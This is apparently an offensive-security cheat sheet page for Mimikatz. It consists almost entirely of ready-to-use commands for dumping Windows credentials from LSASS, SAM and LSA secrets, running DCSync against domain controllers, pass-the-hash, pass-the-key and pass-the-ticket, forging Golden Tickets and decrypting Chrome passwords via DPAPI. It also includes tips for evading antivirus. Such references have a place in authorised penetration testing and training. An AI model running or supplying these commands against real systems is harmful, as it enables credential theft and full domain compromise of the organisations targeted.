+++
title = "Mimikatz"
+++

Mimikatz is a post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets.

## Important Notes

- **Debug Privilege**: Most Mimikatz operations require `privilege::debug` to access LSASS memory
- **Administrator Required**: Mimikatz typically needs administrator privileges to function
- **LSASS Access**: Many operations read from LSASS memory, which is protected by Windows
- **Detection**: Mimikatz is heavily flagged by security products and EDR solutions
- **Pass the Hash**: When using `sekurlsa::pth`, a new window will open - run commands in that new window
- **Golden Tickets**: Golden Tickets are valid until the KRBTGT account password is changed (typically 180 days by default)
- **Ticket Files**: Exported Kerberos tickets use `.kirbi` format
- **Domain Syntax**: Use "." for domain when targeting local machine accounts

## Basic Usage & Privilege Escalation

```bash
# Launch Mimikatz (via SMB share)
\\tsclient\share\mimikatz.exe

# Enable debug privilege (required for most operations)
privilege::debug

# Elevate token to SYSTEM
token::elevate

# Write to console in bae64 (avoid AV flagging)
base64 /out:true
```

## Credential Dumping

### LSASS Memory (sekurlsa)

**Dump All Credentials:**
```bash
# VERBOSE: Dumps credentials from all providers (Kerberos, WDigest, MSV, etc.)
sekurlsa::logonpasswords
```

**Dump Specific Hash Types:**
```bash
# Dumps only LM/NTLM hashes
sekurlsa::msv
```

**Export Kerberos Tickets:**
```bash
# Avoid AV flagging
base64 /out:true

# Export Kerberos Tickets (TGT/TGS) to disk
sekurlsa::tickets /export
# $ : machine tickets (computers)
# @ : service tickets (users)
```

**Extract AES Keys:**
```bash
# Extract AES Keys for Pass the Key attacks
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

### SAM Database

```bash
# Dumps local SAM database (local user hashes)
lsadump::sam
```

### LSA Secrets

```bash
# Dumps LSA Secrets (cached domain credentials, service account passwords, etc.)
lsadump::lsa /patch
```

**Dump Specific Account:**
```bash
# Dump specific account (e.g., KRBTGT for Golden Ticket)
lsadump::lsa /inject /name:krbtgt
```

**DCSync (Remote):**
```bash
# Remotely dump account from Domain Controller
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

## DCSync

Might require `runas`.

```bash
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>" exit
```

## Pass the Hash (PtH)

Pass the Hash allows you to authenticate using an NTLM hash instead of a plaintext password.

```bash
# Use "." for domain if targeting local machine
# IMPORTANT: Run commands inside the NEW window that pops up
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

**Alternative Syntax:**
```bash
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH> /run:cmd.exe
```

## Pass the Key (PtK) / OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

**Extract AES Keys First:**
```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

**Pass the Key with AES:**
```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

## Pass the Ticket (PtT)

Pass the Ticket allows you to use stolen Kerberos tickets to authenticate as another user.

**Export Tickets:**
```bash
# Export tickets from memory to .kirbi files
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

**Inject Ticket:**
```bash
# Inject ticket into current session
.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
```

## Golden Ticket Attack

A Golden Ticket is a forged Kerberos TGT that allows you to impersonate any user in the domain, including domain administrators.

### Step 1: Get KRBTGT Hash & SID

**Method A (On DC):**
```bash
lsadump::lsa /inject /name:krbtgt
```

**Method B (Remote DCSync):**
```bash
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

### Step 2: Create & Inject Ticket

```bash
# /ptt immediately injects it into memory. /id:500 makes you fake-admin.
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /id:500 /ptt
```

### Step 3: Launch Shell

```bash
# Launch shell (Optional, or just use current shell if /ptt was used)
misc::cmd
```

## Credential Manager

Dump credentials stored in Windows Credential Manager:

```bash
\\tsclient\share\mimikatz.exe
privilege::debug
sekurlsa::credman
```

## DPAPI (Data Protection API)

Decrypt data protected by Windows DPAPI, such as browser credentials:

```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
